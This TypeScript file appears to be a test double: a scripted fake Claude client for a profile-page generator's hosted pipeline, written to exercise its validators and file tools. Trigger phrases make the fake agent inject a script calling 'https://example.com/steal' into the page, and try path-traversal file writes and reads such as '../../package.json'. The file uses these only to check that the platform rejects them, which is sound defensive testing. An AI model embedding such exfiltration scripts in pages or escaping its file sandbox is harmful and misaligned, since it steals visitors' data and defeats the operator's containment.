/**
 * 确定性的假 Claude 客户端（hosted-route D8，`NOWME_CLAUDE_FAKE=1`，只在非生产环境）。
 *
 * 它不调用网络，但走真实的流程：采访时按强制的工具返回结构化结果；生成 / 修改时按轮次调用真实工具
 * （list → write ×3 → validate → preview → finish），所以 validator、render 与平台重新校验都真实运行。
 *
 * 测试用的触发词（写在素材或修改要求里）：
 * - `【假模型：澄清】`：修改任务以 clarify 结束；
 * - `【假模型：违规】`：生成一个含 `fetch(` 的页面（平台重新校验会拒绝）；
 * - `【假模型：越界】`：尝试读写越界路径（工具应拒绝），然后照常完成；
 * - `【假模型：不结束】`：一直调用 validate_page，不调用 finish（触发 MAX_TURNS）。
 */
import type { AssistantContent, ClaudeClient, ClaudeMessage, ClaudeResponse, CreateMessageParams, TextBlock } from './claude.js';

const USAGE = { input_tokens: 1200, output_tokens: 300, cache_read_input_tokens: 1000, cache_creation_input_tokens: 0 };

function allUserText(messages: ClaudeMessage[]): string {
  const parts: string[] = [];
  for (const message of messages) {
    if (message.role !== 'user') continue;
    if (typeof message.content === 'string') parts.push(message.content);
    else for (const block of message.content) if (block.type === 'text') parts.push(block.text);
  }
  return parts.join('\n');
}

function firstUserText(messages: ClaudeMessage[]): string {
  const first = messages[0];
  if (!first || first.role !== 'user') return '';
  if (typeof first.content === 'string') return first.content;
  return first.content.filter((block): block is TextBlock => block.type === 'text').map((block) => block.text).join('\n');
}

function between(text: string, tag: string): string {
  const match = new RegExp(`<${tag}>\\n?([\\s\\S]*?)\\n?</${tag}>`).exec(text);
  return match?.[1]?.trim() ?? '';
}

function clip(text: string, max: number): string {
  return Array.from(text.trim()).slice(0, max).join('');
}

function escapeHtml(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

let counter = 0;
function toolUse(name: string, input: unknown): AssistantContent {
  counter += 1;
  return { type: 'tool_use', id: `toolu_fake_${counter}`, name, input };
}

function respond(content: AssistantContent[]): ClaudeResponse {
  return { content, stop_reason: content.some((block) => block.type === 'tool_use') ? 'tool_use' : 'end_turn', usage: USAGE };
}

// ---------------------------------------------------------------------------
// 采访
// ---------------------------------------------------------------------------

function displayNameFrom(material: string): string {
  const match = /我叫([^\s，,。.！!、]{1,12})/.exec(material) ?? /我是([^\s，,。.！!、]{1,12})/.exec(material);
  return match?.[1] ?? '新朋友';
}

function sentences(text: string): string[] {
  return text
    .split(/[。！!？?\n]/)
    .map((item) => item.trim())
    .filter((item) => item.length >= 2);
}

function hookKinds(text: string): string[] {
  try {
    const scene = JSON.parse(between(text, 'scene_guide')) as { hookKinds?: { kind: string }[] };
    return (scene.hookKinds ?? []).map((item) => item.kind);
  } catch {
    return [];
  }
}

function interviewFollowups(text: string): ClaudeResponse {
  const material = between(text, 'owner_material');
  const files = [...text.matchAll(/图片文件名：(photo-\d+\.[a-z]+)/g)].map((match) => match[1] as string);
  const facts = sentences(material).slice(0, 6).map((item) => clip(item, 100));
  const maxFollowUps = Number(/最多 (\d+) 个追问/.exec(text)?.[1] ?? '1');
  const questions =
    maxFollowUps > 0
      ? [{ question: '能说一个只属于你的具体细节吗？', options: ['有个冷门技能', '最近在沉迷一件事', '有个朋友都知道的小习惯'] }]
      : [];
  return respond([
    toolUse('submit_followups', {
      facts,
      imageNotes: files.map((file) => ({ file, description: '主人上传的一张照片' })),
      missing: [],
      questions,
    }),
  ]);
}

function interviewBrief(text: string): ClaudeResponse {
  const material = between(text, 'owner_material');
  const name = displayNameFrom(material);
  const facts = sentences(material).slice(0, 5);
  const answers = between(text, 'owner_followup_answers');
  const correction = between(text, 'owner_correction');
  const kinds = hookKinds(text);
  const files = [...between(text, 'owner_images').matchAll(/(photo-\d+\.[a-z]+)/g)].map((match) => match[1] as string);
  const aiView = [
    correction ? `按你的意见改了：${clip(correction, 60)}` : `你是${name}。`,
    ...facts.slice(0, 2).map((fact) => `${clip(fact, 80)}。`),
  ];
  if (aiView.length < 3) aiView.push('你想在这面墙上认识同频的人。');
  return respond([
    toolUse('submit_brief', {
      displayName: name,
      firstScreen: `${name}的名字和一个让人记住的细节`,
      suggestedBlocks: ['hero', 'about', 'hooks'],
      facts: facts.map((fact) => ({ text: fact, source: 'interview' })),
      images: files.map((file) => ({ file, description: '主人上传的一张照片' })),
      quotes: facts.slice(0, 1),
      highlights: facts.slice(0, 1),
      intentAspect: '让大家认识我',
      intentRemember: facts[0] ?? '一个具体的细节',
      tone: '轻松',
      boundaries: { name: `昵称“${name}”`, school: '不显示', gradeMajor: '不显示', photo: '可以', hidden: [], rejected: [] },
      unknowns: answers.includes('跳过') ? ['追问里跳过的细节'] : [],
      hooks: [
        { kind: kinds[0] ?? '', text: clip(`可以来问我${facts[0] ?? '任何事'}`, 30), opener: `你好${name}，我在墙上看到你的页面，想聊聊～` },
        { kind: kinds[1] ?? kinds[0] ?? '', text: '想找人一起玩', opener: `嗨${name}，我也想一起，怎么联系你？` },
      ],
      aiView,
      mustHaveMissing: [],
      profileSuggestions: facts.slice(0, 2).map((fact) => ({ category: 'fact', text: fact })),
    }),
  ]);
}

// ---------------------------------------------------------------------------
// 生成与修改
// ---------------------------------------------------------------------------

interface BriefFacts {
  name: string;
  aiView: string[];
  hooks: { kind: string; text: string; opener: string }[];
  images: string[];
}

function briefFacts(first: string): BriefFacts {
  const brief = between(first, 'owner_brief');
  const name = /- 名字：(?:昵称“)?([^”\n]{1,24})/.exec(brief)?.[1]?.trim() ?? '主人';
  const aiView = [...brief.matchAll(/^> (.+)$/gm)].map((match) => (match[1] as string).trim()).filter((line) => !/^(保存在|由 NOWMe|场景：)/.test(line));
  const hooks = [...brief.matchAll(/^\| \d \| ([^|]*) \| ([^|]+) \| ([^|]+) \|$/gm)].map((match) => ({
    kind: (match[1] as string).trim(),
    text: clip(match[2] as string, 32),
    opener: clip(match[3] as string, 80),
  }));
  const images = [...first.matchAll(/- assets\/(photo-\d+\.[a-z]+)/g)].map((match) => match[1] as string);
  return { name, aiView, hooks, images };
}

function pageHtml(facts: BriefFacts, violation: boolean): string {
  const name = escapeHtml(facts.name);
  const about = facts.aiView.map((line) => `<p>${escapeHtml(line)}</p>`).join('\n      ');
  const hooks = facts.hooks.map((hook) => `<li>${escapeHtml(hook.text)}</li>`).join('\n        ');
  const image = facts.images[0] ? `\n      <img src="assets/${facts.images[0]}" alt="${name}的照片" style="width:100%;border-radius:12px">` : '';
  const script = violation ? `\n  <script>fetch('https://example.com/steal');</script>` : '';
  return `<!doctype html>
<html lang="zh-CN" data-nm-motion="calm">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${name}</title>
  <link rel="stylesheet" href="/_nowme/kit/v1/nowme.css">
  <script src="/_nowme/kit/v1/nowme.js"></script>
  <style>
    body { margin: 0; padding: 24px; background: #fff7e6; color: #222; }
    section { margin-bottom: 24px; }
    h1 { font-size: 40px; margin: 0 0 8px; }
  </style>
</head>
<body>
  <main>
    <section data-nm-id="hero">
      <h1>${name}</h1>
      <p>你好，我是${name}。</p>${image}
    </section>
    <section data-nm-id="about">
      ${about || '<p>很高兴认识你。</p>'}
    </section>
    <section data-nm-id="hooks">
      <h2>可以找我聊</h2>
      <ul>
        ${hooks || '<li>随时来聊</li>'}
      </ul>
    </section>
  </main>${script}
</body>
</html>
`;
}

function cardJson(facts: BriefFacts): string {
  const hooks = (facts.hooks.length >= 2 ? facts.hooks : [
    { kind: '', text: '随时来聊', opener: '你好，我在墙上看到你的页面～' },
    { kind: '', text: '想认识新朋友', opener: '嗨，想认识一下你！' },
  ]).slice(0, 3);
  return JSON.stringify(
    {
      schemaVersion: 1,
      displayName: clip(facts.name, 24),
      tagline: clip(facts.aiView[1] ?? facts.aiView[0] ?? `我是${facts.name}`, 40),
      hooks: hooks.map((hook, index) => ({
        id: `hook-${index + 1}`,
        ...(/^[a-z][a-z0-9-]{0,39}$/.test(hook.kind) ? { kind: hook.kind } : {}),
        text: hook.text.length >= 2 ? hook.text : `${hook.text}呀`,
        opener: hook.opener,
      })),
    },
    null,
    2,
  ).concat('\n');
}

function manifestJson(sceneType: string): string {
  return `${JSON.stringify(
    {
      schemaVersion: 1,
      sceneType,
      kitVersion: '1',
      motionLevel: 'calm',
      fonts: [],
      extraChars: '',
      blocks: ['hero', 'about', 'hooks'],
      generator: { agent: 'nowme-hosted', skillVersion: '0.1.0', fake: true },
    },
    null,
    2,
  )}\n`;
}

function sceneTypeOf(first: string): string {
  return /"sceneType":\s*"([a-z]+)"/.exec(first)?.[1] ?? 'general';
}

/** 修改：在目标区块（没指定时第一个区块）开头插入一段说明修改的文字。 */
function editedHtml(html: string, block: string | null, request: string): string {
  const target = block ?? /data-nm-id="([a-z][a-z0-9-]*)"/.exec(html)?.[1] ?? 'hero';
  const pattern = new RegExp(`(<[a-z]+[^>]*data-nm-id="${target}"[^>]*>)`);
  return html.replace(pattern, `$1\n      <p class="nm-edited">已按要求修改：${escapeHtml(clip(request, 60))}</p>`);
}

function lastToolResultText(messages: ClaudeMessage[]): string {
  const last = messages.at(-1);
  if (!last || last.role !== 'user' || typeof last.content === 'string') return '';
  for (const block of last.content) {
    if (block.type === 'tool_result') {
      return typeof block.content === 'string' ? block.content : block.content.filter((item): item is TextBlock => item.type === 'text').map((item) => item.text).join('\n');
    }
  }
  return '';
}

function generation(params: CreateMessageParams): ClaudeResponse {
  const first = firstUserText(params.messages);
  const turn = params.messages.filter((message) => message.role === 'assistant').length + 1;
  const isEdit = first.includes('<owner_edit_request>');
  const sceneType = sceneTypeOf(first);
  const marker = (name: string) => first.includes(`【假模型：${name}】`);

  if (marker('不结束')) return respond([toolUse('validate_page', {})]);

  if (isEdit) {
    const request = between(first, 'owner_edit_request');
    const block = /目标区块：data-nm-id="([a-z][a-z0-9-]*)"/.exec(first)?.[1] ?? null;
    if (marker('澄清')) return respond([toolUse('finish', { outcome: 'clarify', message: '你想改哪一块？hero、about 还是 hooks？' })]);
    switch (turn) {
      case 1:
        return respond([{ type: 'text', text: '先读一下当前页面。' }, toolUse('read_page_file', { path: 'index.html' })]);
      case 2:
        return respond([toolUse('write_page_file', { path: 'index.html', content: editedHtml(lastToolResultText(params.messages), block, request) })]);
      case 3:
        return respond([toolUse('validate_page', {})]);
      default:
        return respond([toolUse('finish', { outcome: 'done', message: `已修改 ${block ?? '页面'}。` })]);
    }
  }

  const facts = briefFacts(first);
  if (marker('越界') && turn === 1) {
    return respond([
      toolUse('write_page_file', { path: '../../escape.txt', content: 'x' }),
      toolUse('write_page_file', { path: 'assets/evil.svg', content: '<svg/>' }),
      toolUse('write_page_file', { path: 'brief.md', content: 'x' }),
      toolUse('read_skill_file', { path: '../../package.json' }),
      toolUse('read_page_file', { path: '../brief.md' }),
    ]);
  }
  const step = marker('越界') ? turn - 1 : turn;
  switch (step) {
    case 1:
      return respond([toolUse('list_page_files', {})]);
    case 2:
      return respond([
        { type: 'text', text: '设计构想：一张简单的米色卡片，名字是主角。' },
        toolUse('write_page_file', { path: 'index.html', content: pageHtml(facts, marker('违规')) }),
        toolUse('write_page_file', { path: 'card.json', content: cardJson(facts) }),
        toolUse('write_page_file', { path: 'manifest.json', content: manifestJson(sceneType) }),
      ]);
    case 3:
      return respond([toolUse('validate_page', {})]);
    case 4:
      return respond([toolUse('preview_page', {})]);
    default:
      return respond([toolUse('finish', { outcome: 'done', message: '页面做好了：名字在首屏，下面是“AI 眼中的你”和接话点。' })]);
  }
}

export interface FakeClaude extends ClaudeClient {
  /** 收到的全部请求（测试断言缓存断点、资料标签等）。 */
  readonly calls: CreateMessageParams[];
}

export function createFakeClaude(): FakeClaude {
  const calls: CreateMessageParams[] = [];
  return {
    calls,
    async createMessage(params) {
      calls.push(structuredClone(params));
      const choice = params.tool_choice;
      if (choice?.type === 'tool' && choice.name === 'submit_followups') return interviewFollowups(allUserText(params.messages));
      if (choice?.type === 'tool' && choice.name === 'submit_brief') return interviewBrief(allUserText(params.messages));
      return generation(params);
    },
  };
}
